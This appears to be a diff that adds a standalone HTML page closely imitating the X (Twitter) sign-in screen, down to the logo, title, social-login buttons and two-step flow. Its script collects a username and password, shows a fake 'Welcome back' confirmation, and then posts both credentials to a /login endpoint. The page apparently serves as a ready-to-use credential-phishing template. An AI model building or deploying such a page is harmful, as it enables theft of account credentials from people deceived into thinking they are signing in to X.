@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in to X / X</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/5a/X_icon_2.svg">
+    <style>
+        /* --- RESET & FONTS --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
+        body {
+            background-color: #000000; /* X Black */
+            color: #e7e9ea;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh;
+        }
+
+        /* --- LAYOUT (Modal Style) --- */
+        .main-container {
+            width: 100%; height: 100%;
+            display: flex; justify-content: center; align-items: center;
+        }
+
+        .login-box {
+            background-color: #000000;
+            width: 100%; max-width: 600px;
+            min-height: 400px;
+            padding: 30px;
+            border-radius: 16px;
+            display: flex; flex-direction: column; align-items: center;
+            position: relative;
+        }
+
+        /* Desktop specific: centered modal look */
+        @media (min-width: 650px) {
+            .login-box {
+                width: 600px;
+                height: 650px;
+                /* Usually X is a modal, simpler to center div here */
+            }
+        }
+
+        /* --- LOGO --- */
+        .logo-area { width: 100%; display: flex; justify-content: center; margin-bottom: 30px; }
+        .x-logo { width: 30px; height: 30px; fill: #eff3f4; }
+
+        /* --- CONTENT --- */
+        .content { width: 100%; max-width: 300px; display: flex; flex-direction: column; }
+
+        h1 {
+            font-size: 31px; font-weight: 700; color: #e7e9ea;
+            margin-bottom: 30px; line-height: 36px;
+        }
+
+        /* --- BUTTONS (Social) --- */
+        .social-btn {
+            width: 100%; height: 40px; border-radius: 20px;
+            background: #fff; color: #0f1419;
+            border: none; font-size: 15px; font-weight: 600;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            cursor: pointer; margin-bottom: 12px;
+            transition: 0.2s;
+        }
+        .social-btn:hover { background-color: #e6e6e6; }
+        
+        .social-btn.apple { background: #fff; color: #000; }
+
+        /* --- DIVIDER --- */
+        .divider {
+            display: flex; align-items: center; margin: 20px 0; width: 100%;
+        }
+        .line { height: 1px; background: #2f3336; flex: 1; }
+        .or { color: #e7e9ea; margin: 0 10px; font-size: 15px; }
+
+        /* --- INPUTS --- */
+        .input-wrapper {
+            position: relative; margin-bottom: 20px; width: 100%;
+        }
+        
+        .input-field {
+            width: 100%; height: 56px;
+            background: #000; border: 1px solid #333639;
+            border-radius: 4px; color: #fff;
+            padding: 25px 8px 8px 8px; /* Padding for floating label */
+            font-size: 17px; outline: none;
+            transition: 0.2s;
+        }
+        
+        .input-field:focus { border-color: #1d9bf0; }
+
+        .input-label {
+            position: absolute; left: 8px; top: 18px;
+            color: #71767b; font-size: 17px;
+            pointer-events: none; transition: 0.2s;
+        }
+
+        /* Floating Label Logic */
+        .input-field:focus ~ .input-label,
+        .input-field:not(:placeholder-shown) ~ .input-label {
+            top: 6px; font-size: 13px; color: #1d9bf0;
+        }
+        .input-field:not(:focus):not(:placeholder-shown) ~ .input-label { color: #71767b; }
+
+        /* --- NEXT BUTTON --- */
+        .next-btn {
+            width: 100%; height: 36px; border-radius: 18px;
+            background: #eff3f4; color: #0f1419;
+            border: none; font-size: 15px; font-weight: 700;
+            cursor: pointer; margin-top: 5px; position: relative;
+        }
+        .next-btn:hover { background: #d7dbdc; }
+        .next-btn:disabled { opacity: 0.5; cursor: default; }
+
+        .black-btn {
+            background: #000; color: #eff3f4; border: 1px solid #536471;
+        }
+        .black-btn:hover { background: #16181c; }
+
+        /* --- SPINNER --- */
+        .spinner {
+            display: none; width: 18px; height: 18px;
+            border: 2px solid #0f1419; border-top-color: transparent;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        }
+        @keyframes spin { to { transform: translate(-50%, -50%) rotate(360deg); } }
+
+        /* --- STEPS & SUCCESS --- */
+        #step2, #successView { display: none; }
+        
+        .forgot {
+            color: #eff3f4; font-size: 15px; margin-top: 20px;
+            border: 1px solid #536471; background: transparent;
+            height: 36px; border-radius: 18px; width: 100%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 700; cursor: pointer; text-decoration: none;
+        }
+
+        .user-show {
+            background: #000; border: 1px solid #333639; padding: 10px;
+            border-radius: 20px; color: #71767b; font-size: 14px;
+            margin-bottom: 20px; display: inline-block; cursor: not-allowed;
+        }
+
+        /* Success */
+        .success-icon { font-size: 50px; color: #1d9bf0; margin-bottom: 20px; }
+        .success-text { font-size: 20px; font-weight: 700; }
+
+        /* --- MOBILE --- */
+        @media (max-width: 600px) {
+            .login-box { height: 100vh; padding: 15px; justify-content: flex-start; }
+            .content { max-width: 100%; padding: 0 15px; }
+            h1 { font-size: 26px; }
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elements
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const successView = document.getElementById('successView');
+            const form = document.getElementById('loginForm');
+            
+            const emailIn = document.getElementById('username');
+            const passIn = document.getElementById('password');
+            const userDisplay = document.getElementById('userDisplay');
+            
+            const btn1 = document.getElementById('btn1');
+            const btn2 = document.getElementById('btn2');
+            const spin1 = document.getElementById('spin1');
+            const spin2 = document.getElementById('spin2');
+            const txt1 = document.getElementById('txt1');
+            const txt2 = document.getElementById('txt2');
+
+            // --- STEP 1: EMAIL ---
+            btn1.addEventListener('click', function() {
+                if(!emailIn.value) {
+                    emailIn.focus(); return;
+                }
+
+                // Load
+                btn1.disabled = true;
+                txt1.style.display = 'none';
+                spin1.style.display = 'block';
+
+                setTimeout(() => {
+                    step1.style.display = 'none';
+                    step2.style.display = 'flex';
+                    step2.style.flexDirection = 'column';
+                    
+                    userDisplay.textContent = emailIn.value; // Update user tag
+                    
+                    btn1.disabled = false;
+                    txt1.style.display = 'block';
+                    spin1.style.display = 'none';
+                }, 1000);
+            });
+
+            // --- STEP 2: PASSWORD & SUBMIT ---
+            btn2.addEventListener('click', function(e) {
+                e.preventDefault();
+
+                if(!passIn.value) {
+                    passIn.focus(); return;
+                }
+
+                // Load
+                btn2.disabled = true;
+                txt2.style.display = 'none';
+                spin2.style.display = 'block';
+
+                setTimeout(() => {
+                    step2.style.display = 'none';
+                    successView.style.display = 'flex';
+                    successView.style.flexDirection = 'column';
+                    successView.style.alignItems = 'center';
+
+                    // Final Submit
+                    setTimeout(() => {
+                        form.submit();
+                    }, 2000);
+                }, 1500);
+            });
+        });
+    </script>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="login-box">
+            
+            <div class="logo-area">
+                <svg viewBox="0 0 24 24" class="x-logo"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+            </div>
+
+            <form id="loginForm" action="/login" method="POST" style="width:100%; display:flex; justify-content:center;">
+
+                <div id="step1" class="content">
+                    <h1>Sign in to X</h1>
+
+                    <button type="button" class="social-btn">
+                        <svg viewBox="0 0 24 24" width="20" height="20"><g transform="matrix(1, 0, 0, 1, 27.009001, -39.238998)"><path fill="#4285F4" d="M -3.264 51.509 C -3.264 50.719 -3.334 49.969 -3.454 49.239 L -14.754 49.239 L -14.754 53.749 L -8.284 53.749 C -8.574 55.229 -9.424 56.479 -10.684 57.329 L -10.684 60.329 L -6.824 60.329 C -4.564 58.239 -3.264 55.159 -3.264 51.509 Z"/><path fill="#34A853" d="M -14.754 63.239 C -11.514 63.239 -8.804 62.159 -6.824 60.329 L -10.684 57.329 C -11.764 58.049 -13.134 58.489 -14.754 58.489 C -17.884 58.489 -20.534 56.379 -21.484 53.529 L -25.464 53.529 L -25.464 56.619 C -23.494 60.539 -19.444 63.239 -14.754 63.239 Z"/><path fill="#FBBC05" d="M -21.484 53.529 C -21.734 52.809 -21.864 52.039 -21.864 51.239 C -21.864 50.439 -21.724 49.669 -21.484 48.949 L -21.484 45.859 L -25.464 45.859 C -26.284 47.479 -26.754 49.299 -26.754 51.239 C -26.754 53.179 -26.284 54.999 -25.464 56.619 L -21.484 53.529 Z"/><path fill="#EA4335" d="M -14.754 43.989 C -12.984 43.989 -11.404 44.599 -10.154 45.789 L -6.734 42.369 C -8.804 40.429 -11.514 39.239 -14.754 39.239 C -19.444 39.239 -23.494 41.939 -25.464 45.859 L -21.484 48.949 C -20.534 46.099 -17.884 43.989 -14.754 43.989 Z"/></g></svg>
+                        Sign in with Google
+                    </button>
+                    <button type="button" class="social-btn apple">
+                        <svg viewBox="0 0 24 24" width="20" height="20"><path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.938 1.57-.053 0-.109 0-.161-.01-.176-1.25.533-2.5 1.378-3.36.777-.77 2.059-1.34 2.94-1.34.033.05.043.05.055.06h.02c0 .01 0 .01-.01.01zm-2.71 4.78c-1.63 0-2.868.87-3.65.87-.772 0-1.938-.9-3.218-.9-1.64 0-3.15.93-4 2.37-1.725 2.92-.44 7.23 1.22 9.58.81 1.15 1.78 2.45 3.03 2.45 1.22 0 1.68-.78 3.17-.78 1.48 0 1.9.78 3.12.78 1.25 0 2.09-1.12 2.87-2.45.9-1.3 1.27-2.58 1.29-2.65-.02-.02-2.5-1-2.5-3.86 0-2.87 2.36-4.22 2.46-4.28-.57-2.49-3.24-2.8-3.79-2.8z"></path></svg>
+                        Sign in with Apple
+                    </button>
+
+                    <div class="divider">
+                        <div class="line"></div><div class="or">or</div><div class="line"></div>
+                    </div>
+
+                    <div class="input-wrapper">
+                        <input type="text" id="username" name="username" class="input-field" placeholder=" " autocomplete="off">
+                        <label for="username" class="input-label">Phone, email, or username</label>
+                    </div>
+
+                    <button type="button" id="btn1" class="next-btn">
+                        <span id="txt1">Next</span>
+                        <div id="spin1" class="spinner"></div>
+                    </button>
+
+                    <button type="button" class="forgot">Forgot password?</button>
+                    
+                    <p style="font-size:15px; color:#71767b; margin-top:40px;">
+                        Don't have an account? <a href="#" style="color:#1d9bf0; text-decoration:none;">Sign up</a>
+                    </p>
+                </div>
+
+                <div id="step2" class="content">
+                    <h1>Enter your password</h1>
+                    
+                    <div id="userDisplay" class="user-show">user@example.com</div>
+
+                    <div class="input-wrapper">
+                        <input type="password" id="password" name="password" class="input-field" placeholder=" ">
+                        <label for="password" class="input-label">Password</label>
+                    </div>
+
+                    <button type="button" id="btn2" class="next-btn">
+                        <span id="txt2">Log in</span>
+                        <div id="spin2" class="spinner"></div>
+                    </button>
+                    
+                    <p style="font-size:15px; color:#71767b; margin-top:40px;">
+                        Don't have an account? <a href="#" style="color:#1d9bf0; text-decoration:none;">Sign up</a>
+                    </p>
+                </div>
+
+                <div id="successView" class="content">
+                    <div class="success-icon">✓</div>
+                    <div class="success-text">Welcome back.</div>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+</body>
+</html>
